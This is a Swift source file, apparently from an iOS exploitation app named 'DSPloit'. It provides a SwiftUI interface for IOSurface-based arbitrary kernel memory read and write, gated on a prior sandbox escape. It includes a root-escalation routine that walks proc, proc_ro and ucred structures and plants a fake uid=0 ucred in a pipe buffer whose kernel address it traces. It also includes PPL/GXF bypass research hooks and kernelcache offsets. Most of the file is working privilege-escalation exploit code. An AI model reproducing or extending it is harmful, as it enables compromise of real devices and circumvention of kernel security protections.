//
//  BleedingEdgeIOSurfaceKRW.swift
//  DSPloit
//
//  IOSurface KRW Research & Exploitation View
//  Created by Royan
//

import SwiftUI

struct BleedingEdgeIOSurfaceKRWView: View {
    @ObservedObject private var engine = IOSurfaceKRWEngine.shared
    @ObservedObject private var mgr = dspmgr.shared
    
    @State private var resultMsg = ""
    @State private var gxfReport = ""
    @State private var dmaReport = ""
    @State private var readAddr = ""
    @State private var readResult = ""
    @State private var writeAddr = ""
    @State private var writeVal = ""
    @State private var writeResult = ""
    @State private var rootResult = ""
    
    var body: some View {
        List {
            // Status
            Section(header: HeaderLabel(text: "IOSurface KRW Status", icon: "cpu")) {
                HStack {
                    StatusIndicator(active: mgr.dsready, label: "Kernel")
                    Spacer()
                    StatusIndicator(active: mgr.sbxready, label: "Sandbox")
                    Spacer()
                    StatusIndicator(active: engine.isReady, label: "IOSurface")
                }
                
                if engine.surfaceID != 0 {
                    VStack(alignment: .leading, spacing: 4) {
                        InfoRow(label: "Surface ID", value: "\(engine.surfaceID)", color: .cyan)
                        InfoRow(label: "Mapped Addr", value: String(format: "0x%llx", engine.mappedAddress), color: .green)
                    }
                }
            }
            
            // Initialize
            Section(header: HeaderLabel(text: "Initialize", icon: "bolt.fill")) {
                Button(action: {
                    let result = engine.openIOSurfaceRoot()
                    resultMsg = result.message
                }) {
                    HStack {
                        Image(systemName: "play.circle.fill")
                        Text("Open IOSurfaceRoot")
                        Spacer()
                        if engine.isReady {
                            Image(systemName: "checkmark.circle.fill")
                                .foregroundStyle(.green)
                        }
                    }
                }
                .disabled(!mgr.dsready || !mgr.sbxready)
                
                if !mgr.sbxready {
                    PlainAlert(
                        title: "Requires Sandbox Escape",
                        icon: "lock.fill",
                        text: "Run sandbox escape first (Main tab → Initialize System)",
                        color: .orange
                    )
                }
            }
            
            // Quick Address Buttons (tap to copy or auto-fill)
            Section(header: HeaderLabel(text: "Quick Addresses (tap to paste)", icon: "doc.on.clipboard")) {
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernbase)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_base")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernbase))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.cyan)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let addr = String(format: "0x%llx", mgr.kernslide)
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("kernel_slide")
                            .font(.caption)
                        Spacer()
                        Text(String(format: "0x%llx", mgr.kernslide))
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.orange)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let proc = ds_get_our_proc()
                    let addr = String(format: "0x%llx", proc)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_proc")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_proc()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
                
                Button(action: {
                    let task = ds_get_our_task()
                    let addr = String(format: "0x%llx", task)
                    readAddr = addr
                    UIPasteboard.general.string = addr
                }) {
                    HStack {
                        Text("our_task")
                            .font(.caption)
                        Spacer()
                        Text(mgr.dsready ? String(format: "0x%llx", ds_get_our_task()) : "—")
                            .font(.system(size: 11, design: .monospaced))
                            .foregroundStyle(.green)
                        Image(systemName: "doc.on.doc")
                            .foregroundStyle(.blue)
                    }
                }
                .disabled(!mgr.dsready)
            }
            
            // Read Test
            Section(header: HeaderLabel(text: "Memory Read (via IOSurface)", icon: "magnifyingglass")) {
                TextField("Address (hex)", text: $readAddr)
                    .font(.system(.body, design: .monospaced))
                
                Button("Read 8 bytes") {
                    guard let addr = UInt64(readAddr.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    let val = engine.propertyRead(address: addr)
                    readResult = String(format: "0x%llx = 0x%016llx", addr, val)
                }
                .disabled(!mgr.dsready)
                
                if !readResult.isEmpty {
                    Text(readResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(.green)
                        .textSelection(.enabled)
                }
            }
            
            // Write Test
            Section(header: HeaderLabel(text: "Memory Write", icon: "pencil.line")) {
                TextField("Write Address (hex)", text: $writeAddr)
                    .font(.system(.body, design: .monospaced))
                TextField("Value (hex)", text: $writeVal)
                    .font(.system(.body, design: .monospaced))
                
                Button("Write 8 bytes") {
                    guard let addr = UInt64(writeAddr.replacingOccurrences(of: "0x", with: ""), radix: 16),
                          let val = UInt64(writeVal.replacingOccurrences(of: "0x", with: ""), radix: 16) else { return }
                    engine.propertyWrite(address: addr, value: val)
                    // Read back to verify
                    let readBack = engine.propertyRead(address: addr)
                    writeResult = String(format: "Wrote 0x%llx → 0x%llx\nRead back: 0x%016llx\n%@",
                                        val, addr, readBack,
                                        readBack == val ? "✅ SUCCESS" : "❌ BLOCKED (PPL?)")
                }
                .disabled(!mgr.dsready)
                .foregroundStyle(.red)
                
                if !writeResult.isEmpty {
                    Text(writeResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(writeResult.contains("SUCCESS") ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // One-tap Root Attempt
            Section(header: HeaderLabel(text: "⚡ Root Escalation Test", icon: "bolt.shield.fill")) {
                Button(action: attemptRoot) {
                    HStack {
                        Image(systemName: "person.badge.key.fill")
                        Text("Attempt uid=0 (Root)")
                        Spacer()
                        Image(systemName: "exclamationmark.triangle.fill")
                            .foregroundStyle(.orange)
                    }
                    .foregroundStyle(.red)
                }
                .disabled(!mgr.dsready)
                
                if !rootResult.isEmpty {
                    Text(rootResult)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(rootResult.contains("SUCCESS") ? .green : .orange)
                        .textSelection(.enabled)
                }
                
                Text("Writes uid=0 to ucred. PPL may block this.")
                    .font(.caption2)
                    .foregroundStyle(.secondary)
            }
            
            // Research: GXF Entry
            Section(header: HeaderLabel(text: "GXF Entry Research", icon: "shield.lefthalf.filled")) {
                Button("Generate GXF Report") {
                    gxfReport = engine.researchGXFEntry()
                }
                
                if !gxfReport.isEmpty {
                    Text(gxfReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.cyan)
                        .textSelection(.enabled)
                }
            }
            
            // Research: DMA Bypass
            Section(header: HeaderLabel(text: "DMA PPL Bypass Research", icon: "bolt.shield")) {
                Button("Generate DMA Report") {
                    dmaReport = engine.researchDMABypass()
                }
                
                if !dmaReport.isEmpty {
                    Text(dmaReport)
                        .font(.system(size: 10, design: .monospaced))
                        .foregroundStyle(.orange)
                        .textSelection(.enabled)
                }
            }
            
            // Kernelcache Analysis Results
            Section(header: HeaderLabel(text: "Kernelcache Findings", icon: "doc.text.magnifyingglass")) {
                VStack(alignment: .leading, spacing: 6) {
                    Text("From deep_analyze_v3.py:")
                        .font(.caption.bold())
                    
                    InfoRow(label: "IOSurface strings", value: "762", color: .cyan)
                    InfoRow(label: "PPL checks (bit#14)", value: "223", color: .red)
                    InfoRow(label: "GXF accesses", value: "50", color: .orange)
                    InfoRow(label: "pmap functions", value: "7 with PPL checks", color: .purple)
                    
                    Text("\nKey addresses (file offsets):")
                        .font(.caption.bold())
                    
                    Group {
                        Text("GXF handler: 0xf0c440")
                        Text("PPL check #1: 0xe33e14")
                        Text("pmap_enter: 0x11126c0 (667 branches)")
                        Text("IOSurfaceRoot: 0x0067d03b (string)")
                        Text("Largest func: 0x155e280 (106KB)")
                    }
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundStyle(.green)
                }
            }
            
            // Result
            if !resultMsg.isEmpty {
                Section(header: HeaderLabel(text: "Result", icon: "info.circle")) {
                    Text(resultMsg)
                        .font(.system(size: 11, design: .monospaced))
                        .foregroundStyle(engine.isReady ? .green : .red)
                        .textSelection(.enabled)
                }
            }
            
            // Log
            if !engine.statusLog.isEmpty {
                Section(header: HeaderLabel(text: "Log", icon: "terminal")) {
                    ForEach(engine.statusLog.suffix(20), id: \.self) { line in
                        Text(line)
                            .font(.system(size: 9, design: .monospaced))
                            .foregroundStyle(.secondary)
                    }
                }
            }
        }
        .navigationTitle("IOSurface KRW")
        .premiumStyling()
    }
    
    private func attemptRoot() {
        guard mgr.dsready else {
            rootResult = "Kernel not ready"
            return
        }
        
        let proc = ds_get_our_proc()
        guard proc != 0 else { rootResult = "proc = 0"; return }
        let task = ds_get_our_task()
        guard task != 0 else { rootResult = "task = 0"; return }
        
        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
        let origUid = ds_kread32(ucred + 0x18)
        
        var report = ""
        report += String(format: "proc:     0x%llx\n", proc)
        report += String(format: "task:     0x%llx\n", task)
        report += String(format: "proc_ro:  0x%llx\n", procRo)
        report += String(format: "ucred:    0x%llx\n", ucred)
        report += String(format: "orig uid: %d\n\n", origUid)
        
        // ============================================================
        // EXPERIMENT: Pipe buffer as controlled kernel memory
        //
        // 1. Create pipe → kernel allocates pipe struct + buffer
        // 2. Find pipe kernel address via proc→fd→fileproc→fileglob→pipe
        // 3. Write fake ucred data to pipe from userspace
        // 4. Pipe buffer now contains uid=0 ucred at known kernel address
        // 5. (Future) Point proc_ro ucred to pipe buffer address
        // ============================================================
        
        report += "=== EXPERIMENT: PIPE BUFFER KRW ===\n\n"
        
        // Step 1: Create pipe
        var pipeFDs: [Int32] = [0, 0]
        let pipeResult = pipe(&pipeFDs)
        guard pipeResult == 0 else {
            report += "pipe() failed: \(pipeResult)\n"
            rootResult = report
            return
        }
        let readFD = pipeFDs[0]
        let writeFD = pipeFDs[1]
        report += String(format: "pipe created: read_fd=%d, write_fd=%d\n", readFD, writeFD)
        
        // Step 2: Write marker data to pipe (so buffer gets allocated)
        // Write exactly 0x88 bytes (size of ucred) with uid=0
        var fakeUcred = [UInt8](repeating: 0, count: 0x88)
        // Copy real ucred structure but with uid=0
        // offset 0x18: cr_uid = 0, cr_ruid = 0
        // offset 0x20: cr_svuid = 0
        // Leave rest as zeros (will fill properly later)
        // Write a marker at offset 0 so we can find it
        let marker: UInt64 = 0x4141424243434444  // "AABBCCDD"
        withUnsafeBytes(of: marker) { fakeUcred.replaceSubrange(0..<8, with: $0) }
        
        let written = write(writeFD, &fakeUcred, fakeUcred.count)
        report += String(format: "wrote %d bytes to pipe\n\n", written)
        
        // Step 3: Find pipe kernel address
        // proc → p_fd → fd_ofiles[fd] → fileproc → fp_glob → fg_data (= pipe struct)
        report += "=== TRACING PIPE IN KERNEL ===\n"
        
        let pFd = ds_kread64(proc + UInt64(off_proc_p_fd))
        report += String(format: "p_fd:      0x%llx\n", pFd)
        
        let ofilesPtr = ds_kread64(pFd + UInt64(off_filedesc_fd_ofiles))
        report += String(format: "fd_ofiles: 0x%llx\n", ofilesPtr)
        
        // fd_ofiles is array of fileproc pointers, indexed by fd number
        // On iOS 18, fileproc pointers may be packed differently
        // Each entry is 8 bytes (pointer to fileproc)
        let fprocPtr = ds_kread64_safe(ofilesPtr + UInt64(readFD) * 8)
        let fproc = fprocPtr | pac_mask  // Strip PAC
        report += String(format: "fileproc[%d]: 0x%llx (raw: 0x%llx)\n", readFD, fproc, fprocPtr)
        
        guard fproc != pac_mask && ds_isvalid(fproc) else {
            report += "fileproc invalid — fd_ofiles format may differ on iOS 18.\n"
            report += "Trying alternative: read fileproc without PAC strip...\n"
            let rawFproc = ds_kread64_safe(ofilesPtr + UInt64(readFD) * 8)
            report += String(format: "  raw: 0x%llx\n", rawFproc)
            close(readFD)
            close(writeFD)
            rootResult = report
            return
        }
        
        let fglob = ds_kread64_safe(fproc + UInt64(off_fileproc_fp_glob))
        let fg = fglob | pac_mask
        report += String(format: "fp_glob:   0x%llx\n", fg)
        
        guard fg != pac_mask && ds_isvalid(fg) else {
            report += "fileglob invalid\n"
            close(readFD)
            close(writeFD)
            rootResult = report
            return
        }
        
        let pipeStruct = ds_kread64_safe(fg + UInt64(off_fileglob_fg_data))
        let pipeAddr = pipeStruct | pac_mask
        report += String(format: "pipe:      0x%llx\n\n", pipeAddr)
        
        guard pipeAddr != pac_mask && ds_isvalid(pipeAddr) else {
            report += "pipe struct invalid\n"
            close(readFD)
            close(writeFD)
            rootResult = report
            return
        }
        
        // Step 4: Dump pipe struct to find buffer address
        report += "=== PIPE STRUCT DUMP ===\n"
        for i in stride(from: 0, to: 0x60, by: 8) {
            let val = ds_kread64_safe(pipeAddr + UInt64(i))
            report += String(format: "  pipe+0x%02x: 0x%016llx\n", i, val)
        }
        
        // Pipe buffer is typically at pipe+0x10 or pipe+0x18
        // Look for our marker (0x4141424243434444)
        report += "\n=== SEARCHING FOR MARKER IN PIPE ===\n"
        var bufferAddr: UInt64 = 0
        for i in stride(from: 0, to: 0x60, by: 8) {
            let ptr = ds_kread64_safe(pipeAddr + UInt64(i))
            if ptr == 0 { continue }
            let stripped = ptr | pac_mask
            if stripped == pac_mask { continue }
            if ds_isvalid(stripped) && stripped != pipeAddr {
                let val = ds_kread64_safe(stripped)
                if val == marker {
                    bufferAddr = stripped
                    report += String(format: "  FOUND buffer at pipe+0x%02x → 0x%llx\n", i, stripped)
                    report += "  Marker verified! We control this kernel memory!\n"
                    break
                }
            }
        }
        
        if bufferAddr != 0 {
            report += String(format: "\n🎯 PIPE BUFFER ADDRESS: 0x%llx\n", bufferAddr)
            report += "We can write ANY data here from userspace!\n"
            report += "This is kernel heap memory we fully control.\n\n"
            report += "=== NEXT STEP ===\n"
            report += "Write fake ucred (uid=0) to pipe buffer,\n"
            report += "then point proc_ro ucred pointer to this address.\n"
            report += String(format: "Target: write 0x%llx to proc_ro+0x%x\n", bufferAddr, off_proc_ro_p_ucred)
        } else {
            report += "  Marker not found in pipe struct pointers.\n"
            report += "  Pipe buffer may use different layout on iOS 18.\n"
        }
        
        // Cleanup
        close(readFD)
        close(writeFD)
        
        report += "\n=== DONE ===\n"
        rootResult = report
    }
}
